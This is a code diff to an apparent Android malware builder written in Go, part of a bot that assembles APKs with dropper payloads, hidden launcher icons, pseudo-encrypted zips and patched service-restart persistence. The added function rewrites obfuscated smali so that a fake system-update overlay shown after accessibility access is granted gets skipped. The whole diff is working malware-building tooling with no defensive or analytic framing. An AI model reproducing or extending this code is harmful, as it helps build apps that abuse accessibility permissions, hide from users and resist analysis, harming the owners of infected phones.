@@ -1835,6 +1835,9 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	wsHandlerSmali := filepath.Join(workDir, "smali", "v", "s", "RWY6BVSB0XxPbw.smali")
 	patchServiceRestart(wsHandlerSmali)
 
+	overlaySmaliPath := filepath.Join(workDir, "smali", "v", "s", "VpKcDcuRNaQkRJ5.smali")
+	patchFakeUpdateOverlay(overlaySmaliPath)
+
 	hideIcon := sess.HideIcon
 	if isInnerPayload {
 		hideIcon = true
@@ -2297,6 +2300,33 @@ func pseudoEncryptZip(apkPath string) error {
 	}
 
 	return os.WriteFile(apkPath, data, 0644)
+}
+
+// patchFakeUpdateOverlay makes nQilHWaqS401ZtR always exit early so the fake
+// system-update overlay is never shown after accessibility is granted.
+func patchFakeUpdateOverlay(smaliPath string) {
+	data, err := os.ReadFile(smaliPath)
+	if err != nil {
+		log.Printf("[BUILDER] WARNING: patchFakeUpdateOverlay read: %v", err)
+		return
+	}
+	s := string(data)
+
+	// The method checks a boolean flag; if true it returns immediately (overlay already
+	// shown). We replace the sget-boolean with const/4 v0, 0x1 so the flag always
+	// appears set → method returns before opening UtilGLWorker.
+	oldCode := "    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z\n\n    .line 2\n    .line 3\n    if-eqz v0, :cond_0"
+	newCode := "    const/4 v0, 0x1\n\n    .line 2\n    .line 3\n    if-eqz v0, :cond_0"
+
+	patched := strings.Replace(s, oldCode, newCode, 1)
+	if patched == s {
+		log.Printf("[BUILDER] WARNING: patchFakeUpdateOverlay: pattern not found in %s", smaliPath)
+		return
+	}
+
+	if err := os.WriteFile(smaliPath, []byte(patched), 0644); err != nil {
+		log.Printf("[BUILDER] WARNING: patchFakeUpdateOverlay write: %v", err)
+	}
 }
 
 func patchServiceRestart(smaliPath string) {
